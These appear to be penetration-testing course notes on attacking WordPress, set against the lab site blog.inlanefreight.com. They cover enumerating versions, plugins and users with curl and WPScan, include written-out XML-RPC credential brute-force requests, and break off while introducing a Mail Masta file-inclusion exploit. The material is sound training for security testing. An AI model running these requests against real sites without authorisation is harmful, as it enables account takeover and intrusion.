# Introduction to WordPress and CMS Architectures

## 1. WordPress Overview
WordPress is the most widely deployed open-source Content Management System (CMS) globally, powering approximately one-third of all websites. Its high degree of customizability and SEO optimization makes it a standard choice for enterprise environments, handling everything from standard blogs to complex e-commerce platforms, project management tools, and document repositories.

### 1.1. Technical Stack
- **Core Language:** PHP
- **Web Server:** Typically deployed on Apache (though Nginx is also common in reverse proxy architectures)
- **Database Backend:** MySQL or MariaDB

### 1.2. Extensibility and Security Implications
The platform relies heavily on an extensive ecosystem of themes and plugins (e.g., WPForms, MonsterInsights, Constant Contact) to expand its core functionality. However, this extensible nature is its primary security weakness. The integration of third-party code frequently introduces misconfigurations and vulnerabilities, making WordPress a prime target for security audits and penetration testing.

## 2. Content Management System (CMS) Fundamentals
A CMS is an infrastructure tool designed to abstract the complexities of web development. It handles the backend infrastructure, allowing administrators and content creators to focus on presentation and design without requiring direct code manipulation. Management is typically handled through a WYSIWYG (What You See Is What You Get) editor and centralized media libraries, eliminating the need for direct server interaction via FTP/SFTP.

### 2.1. Core CMS Components
A standard CMS architecture relies on two primary components:
- **Content Management Application (CMA):** The graphical user interface (GUI) utilized by administrators to add, modify, and manage content.
- **Content Delivery Application (CDA):** The backend engine that processes the input from the CMA, compiles the underlying code, and dynamically renders the front-end website.

### 2.2. Key Features of a Robust CMS
From a systems administration and deployment perspective, a reliable CMS must provide:
- **Extensibility:** Seamless integration of custom functionalities without altering core source code.
- **Access Control:** Granular user management and Role-Based Access Control (RBAC) to enforce the principle of least privilege.
- **Media Management:** Secure interfaces for uploading and embedding assets.
- **Version Control:** Mechanisms to track changes and roll back content if necessary.
- **Security and Maintenance:** Active development cycles, regular patch management, and built-in hardening configurations to mitigate external threats.

## 3. Module Objectives: Auditing WordPress
As part of the security assessment lifecycle, evaluating a WordPress deployment involves:
- Understanding its core directory structure and deployment architecture.
- Executing manual and automated enumeration to identify misconfigurations, outdated plugins, and vulnerable themes.
- Analyzing and executing common attack vectors targeting the CMS and its underlying web server infrastructure to achieve full system compromise.

# Hacking WordPress: Architecture and File Structure

## Overview
WordPress is a highly versatile Content Management System (CMS) that can be hosted across Windows, Linux, or macOS environments. In a standard Linux deployment, it relies on a fully configured LAMP stack (Linux, Apache, MySQL, and PHP) prior to installation. Post-installation, the core files and operational directories are housed within the default webroot, typically located at `/var/www/html`.

Understanding this directory structure is critical for footprinting, vulnerability assessment, and identifying potential vectors for Remote Code Execution (RCE) or sensitive data exposure.

## Default Root Directory Tree
The root directory contains the foundational files required for WordPress initialization, routing, and configuration.

    MikyRedHat@htb[/htb]$ tree -L 1 /var/www/html
    .
    ├── index.php
    ├── license.txt
    ├── readme.html
    ├── wp-activate.php
    ├── wp-admin
    ├── wp-blog-header.php
    ├── wp-comments-post.php
    ├── wp-config.php
    ├── wp-config-sample.php
    ├── wp-content
    ├── wp-cron.php
    ├── wp-includes
    ├── wp-links-opml.php
    ├── wp-load.php
    ├── wp-login.php
    ├── wp-mail.php
    ├── wp-settings.php
    ├── wp-signup.php
    ├── wp-trackback.php
    └── xmlrpc.php

## Critical Configuration Files

### 1. The Configuration Hub: `wp-config.php`
This is the most critical file in a WordPress installation. It holds the database connection parameters (hostname, database name, username, and password), authentication keys and salts, the database table prefix, and debugging directives. Compromising this file during an audit often leads directly to database takeover.

    <?php
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'database_name_here' );
    
    /** MySQL database username */
    define( 'DB_USER', 'username_here' );
    
    /** MySQL database password */
    define( 'DB_PASSWORD', 'password_here' );
    
    /** MySQL hostname */
    define( 'DB_HOST', 'localhost' );
    
    /** Authentication Unique Keys and Salts */
    define( 'AUTH_KEY',         'put your unique phrase here' );
    // <SNIP>
    
    /** WordPress Database Table prefix */
    $table_prefix = 'wp_';
    
    /** For developers: WordPress debugging mode. */
    define( 'WP_DEBUG', false );

### 2. Administrative Authentication: `wp-admin` & Login Pages
The `wp-admin` directory serves as the backend dashboard for authenticated users based on their assigned privileges. The default login endpoints are primary targets for brute-force attacks and credential stuffing. Common authentication paths include:
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`

*Security Note:* System Administrators often rename these endpoints (using security plugins) to mitigate automated attacks, requiring deeper directory enumeration to locate the administrative panel.

### 3. API Communication: `xmlrpc.php`
Historically used to facilitate data transmission via HTTP acting as the transport mechanism and XML as the encoding mechanism. While largely superseded by the modern WordPress REST API, `xmlrpc.php` is often left enabled by default. It presents a significant attack surface for XML-RPC pingback attacks, brute-forcing, and Denial of Service (DoS).

### 4. General Information Files
* `index.php`: The primary entry point and homepage rendering file.
* `license.txt`: Discloses the installed WordPress version, a crucial detail for fingerprinting and identifying known CVEs.
* `wp-activate.php`: Handles the email activation workflow during initial site deployment.

## Key Operational Directories

### `wp-content`
This directory houses all user-supplied data, making it a high-priority target during a security assessment. It contains:
* `plugins/`: Third-party plugins (frequent sources of vulnerabilities).
* `themes/`: Active and inactive site themes.
* `uploads/`: Media and file uploads. 

*Exploitation Vector:* The `uploads/` subdirectory must be aggressively enumerated. Misconfigurations here often permit arbitrary file uploads, potentially leading to Remote Code Execution (RCE) via malicious PHP payloads.

### `wp-includes`
Contains core application dependencies, excluding administrative components and themes. This directory stores foundational assets necessary for the CMS to operate, such as SSL certificates, fonts, JavaScript libraries, and core widgets.

    MikyRedHat@htb[/htb]$ tree -L 1 /var/www/html/wp-includes
    .
    ├── <SNIP>
    ├── theme.php
    ├── update.php
    ├── user.php
    ├── vars.php
    ├── version.php
    ├── widgets
    ├── widgets.php
    ├── wlwmanifest.xml
    ├── wp-db.php
    └── wp-diff.php

    # WordPress Identity and Access Management: User Roles

## Overview
In a standard WordPress deployment, Role-Based Access Control (RBAC) is implemented through five default user roles. Understanding these privilege levels is critical for both systems administration and security auditing, particularly when assessing the attack surface for privilege escalation and Remote Code Execution (RCE).

## Standard User Privilege Tiers

| Role | Access Level & Privileges |
| :--- | :--- |
| **Administrator** | Possesses unrestricted access to all administrative functionalities within the application. Privileges include identity management (provisioning/deprovisioning users), global content management, plugin/theme deployment, and direct modification of server-side source code via the built-in editor. |
| **Editor** | Authorized to publish, modify, and manage all content (posts and pages) across the platform, including assets authored by other users. |
| **Author** | Restricted to publishing and managing their own content. They cannot modify, delete, or manage posts created by other users. |
| **Contributor** | Permitted to draft and manage their own content but lacks publishing rights. All drafted content requires administrative or editorial approval prior to publication. |
| **Subscriber** | Represents the lowest privilege tier. Access is strictly limited to front-end browsing, consuming content, and modifying their own user profile data. |

## Security Implications & Attack Vectors

From an offensive security (pentesting) and auditing perspective, compromising an **Administrator** account is typically the primary objective. This access level provides the most direct vector for achieving **Remote Code Execution (RCE)** on the underlying web server, commonly executed by uploading malicious plugins or altering existing theme PHP files.

However, intermediate roles such as **Editors** and **Authors** are highly valuable targets during vulnerability assessments. These accounts frequently possess permissions to interact with specific plugins, third-party integrations, or restricted administrative interfaces that remain inaccessible to standard Subscribers. This access can expose the environment to authenticated exploitation pathways, allowing attackers to leverage vulnerable plugins to escalate privileges or compromise the server.

# WordPress Core Version Enumeration

## Overview
During the initial reconnaissance phase, accurately identifying the target application's software version is a critical step. Uncovering the exact WordPress core version enables security analysts and penetration testers to map the application against known Common Vulnerabilities and Exposures (CVEs) and identify potential misconfigurations, such as default credentials specific to certain software releases.

There are several manual enumeration techniques that can be employed to extract this version information from a target WordPress instance without relying on automated vulnerability scanners.

## 1. Source Code Inspection
The most straightforward approach is analyzing the HTML source code of the target web page (accessible via the `[CTRL + U]` shortcut or by right-clicking and selecting "View page source" in most modern web browsers).

WordPress frequently embeds its active version number within the HTML `<meta>` tags. By searching the Document Object Model (DOM) for the `generator` meta attribute using `[CTRL + F]`, the exact version can often be successfully identified.

### Example HTML Output:
```html
<!-- ...SNIP... -->
<link rel='[https://api.w.org/](https://api.w.org/)' href='[http://blog.inlanefreight.com/index.php/wp-json/](http://blog.inlanefreight.com/index.php/wp-json/)' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="[http://blog.inlanefreight.com/xmlrpc.php?rsd](http://blog.inlanefreight.com/xmlrpc.php?rsd)" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="[http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml](http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml)" /> 
<meta name="generator" content="WordPress 5.3.3" />
<!-- ...SNIP... -->
```

## 2. Command-Line Enumeration (cURL & Grep)
Instead of relying on a graphical browser, this enumeration process can be streamlined from the terminal using standard Linux networking utilities. By sending an HTTP GET request with `cURL` and piping the standard output (stdout) to `grep`, we can dynamically isolate the specific `generator` string.

```bash
# Suppress progress output (-s) and send an HTTP GET request, filtering for the target meta tag
MikyRedHat@htb[/htb]$ curl -s -X GET [http://blog.inlanefreight.com](http://blog.inlanefreight.com) | grep '<meta name="generator"'

# Expected Output:
# <meta name="generator" content="WordPress 5.3.3" />
```

## 3. Asset Enumeration (CSS & JavaScript)
Beyond direct meta tags, web developers and WordPress core functions often append version strings to static assets as a cache-busting mechanism. Inspecting the source code for loaded Cascading Style Sheets (CSS) and JavaScript (JS) file inclusions can inadvertently leak the underlying core or plugin versions.

### Extracting Versions from CSS Links
Look for the `?ver=` parameter appended to stylesheet URLs. If the web administrator has not actively stripped these parameters, they usually mirror the WordPress core version.

```html
<!-- ...SNIP... -->
<link rel='stylesheet' id='bootstrap-css' href='[http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3](http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3)' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css' href='[http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3](http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3)' type='text/css' media='all' />
<!-- ...SNIP... -->
```

### Extracting Versions from JavaScript Links
Similarly, JavaScript inclusions routinely append the same `?ver=` parameters, which can be scraped to cross-reference and confirm the core version previously gathered.

```html
<!-- ...SNIP... -->
<script type='text/javascript' src='[http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp](http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp)'></script>
<script type='text/javascript' src='[http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3](http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3)'></script>
<!-- ...SNIP... -->
```

## 4. Legacy File Enumeration (`readme.html`)
In older legacy deployments, WordPress natively included a default `readme.html` file within the web root directory during installation. If left unremoved by system administrators (poor security hygiene), navigating directly to `http://<target-ip>/readme.html` will often display the exact version of the WordPress instance in plain text.

# WordPress Attack Surface: Plugins and Themes Enumeration

During a web application penetration test or security audit targeting a WordPress CMS, enumerating installed plugins and themes is a critical phase. Vulnerable or outdated third-party extensions often represent the most viable attack vectors. Enumeration can be performed through passive source code inspection or active directory probing.

## 1. Passive Enumeration via Source Code Analysis

Web browsers load CSS and JavaScript files associated with active plugins and themes to render the webpage properly. By manually inspecting the HTML DOM or filtering the page source via command-line utilities, auditors can extract directory paths that reveal installed components.

### 1.1. Extracting Plugin Information
Using `curl` combined with string manipulation tools (`sed`, `grep`, `cut`), we can isolate the `wp-content/plugins/` directory paths from the HTML response.

```bash
# Fetch the homepage and filter for plugin directories
curl -s -X GET [http://blog.inlanefreight.com](http://blog.inlanefreight.com) | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

**Expected Output Example:**
```text
[http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1](http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1)
[http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3](http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3)
```
*Note: The `?ver=` parameter often discloses the exact version of the plugin installed, which is invaluable for mapping CVEs.*

### 1.2. Extracting Theme Information
The methodology remains identical for themes, adjusting the `grep` filter to target the `themes` directory.

```bash
# Fetch the homepage and filter for theme directories
curl -s -X GET [http://blog.inlanefreight.com](http://blog.inlanefreight.com) | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

**Expected Output Example:**
```text
[http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3](http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3)
[http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3](http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3)
```

## 2. Active Enumeration via HTTP Status Codes

Not all plugins or themes actively load resources on the front end. To discover inactive or backend-only components, active enumeration is required. This involves sending direct `GET` requests to expected paths and analyzing the server's HTTP response codes.

### 2.1. Validating Existing Components (HTTP 301 / 200 / 403)
If a queried directory or file exists, the web server will typically return a `301 Moved Permanently` (redirecting to the directory index), a `200 OK` (if directory listing is enabled or a file is hit), or a `403 Forbidden` (if access is restricted but the resource exists).

```bash
# Probing a known plugin directory (HTTP Headers only)
curl -I -X GET [http://blog.inlanefreight.com/wp-content/plugins/mail-masta](http://blog.inlanefreight.com/wp-content/plugins/mail-masta)
```

**Server Response (Component Exists):**
```http
HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:08:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: [http://blog.inlanefreight.com/wp-content/plugins/mail-masta/](http://blog.inlanefreight.com/wp-content/plugins/mail-masta/)
```

### 2.2. Identifying Missing Components (HTTP 404)
If the brute-forced directory does not exist, the server will explicitly return a `404 Not Found` error.

```bash
# Probing a non-existent plugin
curl -I -X GET [http://blog.inlanefreight.com/wp-content/plugins/someplugin](http://blog.inlanefreight.com/wp-content/plugins/someplugin)
```

**Server Response (Component Does Not Exist):**
```http
HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:08:18 GMT
Server: Apache/2.4.29 (Ubuntu)
```

## 3. Automation and Scalability

While manual `cURL` requests are excellent for targeted validation and understanding the underlying HTTP mechanics, comprehensive enumeration against production targets requires automation. 

To expedite this process, SysAdmins and Pentesters typically utilize:
*   **Custom Bash Scripts:** Iterating through a text file containing common plugin/theme names and parsing the status codes.
*   **Fuzzing Tools:** Applications like `wfuzz` or `ffuf` to rapidly brute-force directories.
*   **Specialized Scanners:** Frameworks like **WPScan**, which leverage extensive databases of known plugins, themes, and their associated vulnerabilities to perform both passive and active enumeration seamlessly.

# WordPress Security Assessment: Directory Indexing and Inactive Plugin Risks

## Introduction
When performing a security assessment or vulnerability audit on a WordPress-based web application, the evaluation scope must extend beyond active components. A common misconfiguration and security oversight involves leaving vulnerable or legacy plugins installed in a deactivated state, assuming they are rendered inert.

## The Risk of Inactive Plugins
Deactivating a plugin via the WordPress administration dashboard merely prevents its execution within the application's runtime loop; it **does not** delete its source files or remove them from the underlying web root directory (typically located at `/wp-content/plugins/`). 

If a plugin contains remote code execution (RCE), SQL injection, or local file inclusion (LFI) vulnerabilities, its codebase remains fully accessible to external attackers who can directly query its scripts and files via HTTP requests. 

### Best Practices
* **Asset Removal:** Completely delete any unused or legacy plugins from the server rather than simply deactivating them.
* **Lifecycle Management:** Keep all active plugins, themes, and the core CMS updated to their latest security releases.

## Directory Indexing Vulnerabilities
Directory indexing (or directory listing) occurs when a web server is misconfigured to display a navigable file tree of a directory when no default index file (e.g., `index.php`, `index.html`) is present. This behavior significantly expands the attacker's reconnaissance surface by exposing internal file structures, backup archives, and hidden scripts.

### Enumeration via Command Line
Security auditors can leverage command-line utilities such as `curl` combined with text-formatting tools like `html2text` to inspect directory listings efficiently without rendering a full browser instance.

    curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text

#### Output Analysis
The command parses the HTML directory index and structures it into a readable hierarchy:

    ****** Index of /wp-content/plugins/mail-masta ******
    [ICO]        Name                Last_modified     Size Description
    ===========================================================================
    [PARENTDIR] Parent_Directory                         -  
    [DIR]        amazon_api/          2020-05-13 18:01    -  
    [DIR]        inc/                 2020-05-13 18:01    -  
    [DIR]        lib/                 2020-05-13 18:01    -  
    [    ]        plugin-interface.php 2020-05-13 18:01  88K  
    [TXT]        readme.txt           2020-05-13 18:01 2.2K  
    ===========================================================================
       Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80

By analyzing this listing, an auditor can identify auxiliary components (`amazon_api/`, `lib/`), standalone scripts (`plugin-interface.php`), and documentation files (`readme.txt`, which often reveals vulnerable version numbers).

## Remediation and Hardening
To mitigate directory indexing risks and restrict direct file exposure:

1. **Apache Web Server:** Disable directory listings globally or per-directory within the configuration file or `.htaccess` using the following directive:

       Options -Indexes

2. **Nginx Web Server:** Ensure `autoindex` is turned off in the server block configuration:

       autoindex off;

# WordPress User Enumeration

## Overview
Enumerating valid users is a critical reconnaissance phase during a WordPress security assessment. Acquiring an accurate list of active usernames significantly expands the attack surface, enabling targeted brute-force or credential-stuffing attacks. If successful, attackers can gain authenticated access to the WordPress backend (e.g., as an Author or Administrator). This level of access can be leveraged to modify website content, implant backdoors, or interact with the underlying web server, potentially leading to Remote Code Execution (RCE).

There are two primary manual methods for enumerating users in a standard WordPress deployment.

## Method 1: Author ID Parameter Manipulation

This technique leverages the default WordPress behavior of mapping user IDs to their corresponding usernames via the `author` URL parameter. By default, the initial administrative user is assigned `ID=1`.

### Manual Browser Enumeration
Navigating through published posts and inspecting the author link (e.g., hovering over the "by admin" hyperlink) often reveals the user's account path in the browser's status bar. 

Alternatively, you can manually append the `author` parameter to the base URL to verify if the ID resolves to a valid user:

    http://<target-ip_or_domain>/?author=1

### CLI Enumeration using cURL
You can automate and verify this behavior from the command line using `curl`. By inspecting the HTTP response headers—specifically the `Location` header—you can extract the associated username without fully rendering the page.

**Querying an Existing User:**

    curl -s -I http://blog.inlanefreight.com/?author=1

**Expected Output (HTTP 301 Redirect):**

    HTTP/1.1 301 Moved Permanently
    Date: Wed, 13 May 2020 20:47:08 GMT
    Server: Apache/2.4.29 (Ubuntu)
    X-Redirect-By: WordPress
    Location: http://blog.inlanefreight.com/index.php/author/admin/
    Content-Length: 0
    Content-Type: text/html; charset=UTF-8

*Technical Note: The `Location` header explicitly reveals the username `admin` associated with ID 1.*

**Querying a Non-Existing User:**

    curl -s -I http://blog.inlanefreight.com/?author=100

**Expected Output (HTTP 404 Not Found):**

    HTTP/1.1 404 Not Found
    Date: Wed, 13 May 2020 20:47:14 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Expires: Wed, 11 Jan 1984 05:00:00 GMT
    Cache-Control: no-cache, must-revalidate, max-age=0
    Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
    Transfer-Encoding: chunked
    Content-Type: text/html; charset=UTF-8

*Technical Note: If the queried user ID does not exist in the database, the server returns a standard 404 Not Found error.*

## Method 2: WordPress REST API (JSON Endpoint)

The second method relies on querying the WordPress REST API endpoint, which natively exposes user metadata in JSON format. 

*Security Context: In WordPress core versions prior to 4.7.1, this endpoint displayed all users who had published a post by default. In subsequent versions, its verbosity was restricted, though it may still expose user configurations depending on specific site settings or installed plugins.*

### Querying the Users Endpoint
Using `curl` piped into `jq` provides a cleanly formatted, parsed output of the user array.

    curl -s http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

**Expected Output (JSON):**

    [
      {
        "id": 1,
        "name": "admin",
        "url": "",
        "description": "",
        "link": "http://blog.inlanefreight.com/index.php/author/admin/"
      },
      {
        "id": 2,
        "name": "ch4p",
        "url": "",
        "description": "",
        "link": "http://blog.inlanefreight.com/index.php/author/ch4p/"
      }
    ]

*Technical Note: This output instantly provides exact usernames (`admin`, `ch4p`) alongside their assigned IDs. This enumerated list can then be directly compiled into a dictionary file for targeted password attacks using tools like Hydra or WPScan.*

# WordPress Authentication Brute-Forcing via XML-RPC

## Overview

Upon compiling a robust list of valid usernames, security analysts can orchestrate a password brute-force attack to attempt unauthorized access to the WordPress administrative backend. While traditional brute-forcing targets the standard web portal (`wp-login.php`), leveraging the `xmlrpc.php` API endpoint often proves to be a more stealthy and efficient attack vector, bypassing certain front-end rate limits and protections.

## Exploiting xmlrpc.php for Authentication Validation

Authentication attempts against the `xmlrpc.php` interface require crafting specific XML payloads. By invoking the `wp.getUsersBlogs` method, an auditor can validate credential pairs directly via POST requests.

### Successful Authentication Response

If the injected POST request contains valid credentials, the target server will return an XML response disclosing the user's administrative privileges, the blog ID, and the application URL.

**Command Execution:**

    curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

**Server Response (200 OK):**

    <?xml version="1.0" encoding="UTF-8"?>
    <methodResponse>
      <params>
        <param>
          <value>
            <array><data>
              <value><struct>
                <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
                <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
                <member><name>blogid</name><value><string>1</string></value></member>
                <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
                <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
              </struct></value>
            </data></array>
          </value>
        </param>
      </params>
    </methodResponse>

### Failed Authentication Response

Conversely, if the submitted credentials are invalid, the target server will deny access, responding with a `403 Forbidden` status code embedded within a `faultCode` error block.

**Command Execution:**

    curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

**Server Response (403 Forbidden):**

    <?xml version="1.0" encoding="UTF-8"?>
    <methodResponse>
      <fault>
        <value>
          <struct>
            <member>
              <name>faultCode</name>
              <value><int>403</int></value>
            </member>
            <member>
              <name>faultString</name>
              <value><string>Incorrect username or password.</string></value>
            </member>
          </struct>
        </value>
      </fault>
    </methodResponse>

## The Imperative of Manual Enumeration

Understanding manual enumeration methodologies is a critical prerequisite before transitioning to automated exploitation frameworks. While automated vulnerability scanners exponentially accelerate the penetration testing workflow, security professionals must fundamentally comprehend the underlying mechanics and the network footprint generated on target systems. 

Mastery of manual techniques ensures that an auditor can effectively troubleshoot, calibrate payloads, and validate findings when automated tools fail, trigger Intrusion Detection Systems (IDS), or yield anomalous outputs.

# WPScan: Automated WordPress Enumeration and Vulnerability Scanner

## Overview
WPScan is an industry-standard, black-box automated security scanner designed specifically for auditing WordPress environments. It is utilized by security professionals and system administrators to enumerate target applications and identify potential security flaws, including outdated core versions, vulnerable plugins, misconfigured themes, and exposed user credentials. 

While WPScan is pre-installed on penetration testing distributions such as Parrot OS and Kali Linux, it can also be manually deployed in any standard Linux environment via RubyGems.

## Installation and Verification
For environments where WPScan is not natively available, it can be installed using the Ruby package manager (`gem`).

To install WPScan manually, execute the following command:
    
    MikyRedHat@htb[/htb]$ gem install wpscan

Once the deployment is complete, it is best practice to verify the installation and review the available command-line arguments. The `--hh` flag outputs the comprehensive help menu, which is critical for tailoring the tool to specific auditing requirements.

    MikyRedHat@htb[/htb]$ wpscan --hh

*Note: The usage menu provides extensive configuration parameters, including output formatting, request timeouts, and specific enumeration flags.*

## Enumeration Strategies and Fine-Tuning
WPScan supports highly granular enumeration modules. System administrators and penetration testers must fine-tune the scanner's parameters based on the specific scope and objective of the engagement:

*   **Vulnerability Scanning:** Targeting specific vulnerable plugins or themes that have known CVEs (Common Vulnerabilities and Exposures) or publicly available Proof of Concepts (PoCs).
*   **Comprehensive Auditing:** Performing a full-scope baseline scan of all aspects of the target WordPress site to assess its overall security posture and identify misconfigurations.
*   **User Enumeration:** Extracting valid usernames from the target environment. This list can subsequently be leveraged in brute-force or dictionary-based password guessing attacks against the WordPress authentication portals (e.g., `wp-login.php` or `xmlrpc.php`).

## WPVulnDB API Integration
To maximize the effectiveness of WPScan, it is highly recommended to integrate it with external vulnerability databases. WPScan cross-references the enumerated data against the WPVulnDB database to provide accurate security reports and exploit references.

### Configuration Steps
1. Register for an account on the WPVulnDB platform.
2. Navigate to the user dashboard and generate an API Token.
3. Supply the token during the execution of WPScan using the `--api-token` parameter.

*Note: The free tier of the WPVulnDB API currently restricts usage to 50 requests per day, which is generally sufficient for individual assessments or targeted Homelab testing.*

# WordPress Enumeration with WPScan

## 1. Overview
During a penetration test or security audit, enumerating a WordPress application is a critical phase to identify potential attack vectors. **WPScan** is an industry-standard, black-box vulnerability scanner specifically designed to enumerate various WordPress components, including vulnerable plugins, themes, users, media files, and configuration backups.

By default, WPScan leverages both **passive** (analyzing source code, headers, and RSS feeds) and **aggressive** (brute-forcing, direct file access) detection methods to map the target's attack surface.

## 2. Core Enumeration Flags and Syntax
To perform targeted enumeration, WPScan utilizes the `--enumerate` flag followed by specific component arguments. 

### Key Parameters:
*   `--enumerate` (or `-e`): Triggers the enumeration module. By default, it scans for vulnerable plugins, themes, users, media, and backups.
*   `--enumerate ap`: Restricts the enumeration to **All Plugins**. (Other common arguments include `u` for users, `at` for all themes, and `vp` for vulnerable plugins).
*   `--api-token <TOKEN>`: Integrates with the WPScan Vulnerability Database (WPVulnDB) API to map discovered versions against known CVEs and exploits.
*   `-t <NUMBER>`: Adjusts the number of concurrent threads. The default value is `5`, but it can be increased for faster scanning or decreased to evade intrusion detection systems (IDS).

## 3. Practical Execution & Scan Analysis

The following output demonstrates a standard enumeration scan executed against a target environment. 

### Command Execution
    wpscan --url http://blog.inlanefreight.com --enumerate --api-token <API_TOKEN>

### Scan Breakdown & Auditor Analysis

**A. Server & Infrastructure Fingerprinting**
    [+] URL: http://blog.inlanefreight.com/                                                 
    [+] Headers                                                                         
    |  - Server: Apache/2.4.38 (Debian)
    |  - X-Powered-By: PHP/7.3.15
    | Found By: Headers (Passive Detection)
*Technical Insight:* Passive detection via HTTP headers reveals the underlying backend infrastructure (Apache on Debian and PHP 7.3.15), which is crucial for identifying specific server-side exploits.

**B. Exposed APIs & Services**
    [+] XML-RPC seems to be enabled: http://blog.inlanefreight.com/xmlrpc.php
    | Found By: Direct Access (Aggressive Detection)
    |  - http://codex.wordpress.org/XML-RPC_Pingback_API

    [+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.com/wp-cron.php
    | Found By: Direct Access (Aggressive Detection)
    |  - https://www.iplocation.net/defend-wordpress-from-ddos
*Technical Insight:* The presence of an enabled `xmlrpc.php` exposes the application to potential brute-force and DDoS (Pingback) attacks. External `wp-cron.php` access can also be abused to trigger resource exhaustion (DoS).

**C. Core Version & Theme Enumeration**
    [+] WordPress version 5.3.2 identified (Latest, released on 2019-12-18).
    | Found By: Rss Generator (Passive Detection)

    [+] WordPress theme in use: twentytwenty
    | Location: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/
    | Readme: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/readme.txt
    | [!] The version is out of date, the latest version is 1.2
*Technical Insight:* WPScan successfully parsed the RSS feed generator tag to extract the exact WordPress core version. Furthermore, it identified an outdated theme by accessing its `readme.txt` file.

**D. Vulnerable Plugin Identification**
    [+] Enumerating Vulnerable Plugins (via Passive Methods)
    [i] Plugin(s) Identified:
    [+] mail-masta
    | Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/                 
    | [!] 2 vulnerabilities identified:
    | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
    |      - https://www.exploit-db.com/exploits/40290/ 
    | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
    |      - https://wpvulndb.com/vulnerabilities/8740                                                   
    [+] wp-google-places-review-slider
    | [!] 1 vulnerability identified:
    | [!] Title: WP Google Review Slider <= 6.1 - Authenticated SQL Injection
*Technical Insight:* The API integration matched the installed plugins against the vulnerability database. Critical findings include an Unauthenticated Local File Inclusion (LFI) and multiple SQL Injections (SQLi), providing immediate high-severity attack vectors for exploitation.

**E. User Enumeration**
    [+] Enumerating Users (via Passive and Aggressive Methods)
    [i] User(s) Identified:
    [+] admin
     | Found By: Author Posts - Display Name (Passive Detection)
     | Confirmed By:
     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     |  Login Error Messages (Aggressive Detection)
    [+] david
    [+] roger
*Technical Insight:* The tool mapped valid usernames (`admin`, `david`, `roger`) by inspecting author display names and confirming them via Author ID brute-forcing and login error message behavior. This list is highly valuable for subsequent targeted brute-force attacks against `wp-login.php` or `xmlrpc.php`.

# Exploiting Vulnerable WordPress Plugins: Local File Inclusion (LFI)

## 1. Overview and Enumeration Findings
Following the initial enumeration phase utilizing `wpscan`, the target web application was identified as running an outdated version of WordPress (5.3.2) alongside the legacy `Twenty Twenty` theme. 

The automated vulnerability scanner flagged two potentially critical plugins:
*   **Mail Masta 1.0**: Known to be vulnerable to SQL Injection (SQLi) and Local File Inclusion (LFI).
*   **Google Review Slider**

This documentation focuses on the validation and exploitation of the **Local File Inclusion (LFI)** vulnerability discovered within the `Mail Masta` plugin. The `wpscan` report provided direct references to Exploit-DB Proof of Concepts (PoCs), which detail the exact attack vectors for this version.

## 2. Vulnerability Analysis: Mail Masta 1.0 LFI
According to the Exploit-DB documentation, `Mail Masta 1.0` allows unauthenticated attackers to read sensitive local system files. The security flaw resides in the lack of input sanitization within the `pl` parameter of the `count_of_send.php` script.

**Vulnerable Endpoint Path:**
`/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=[PAYLOAD]`

## 3. Proof of Concept (PoC): Exploitation Phase

### 3.1. Validating LFI via Web Browser
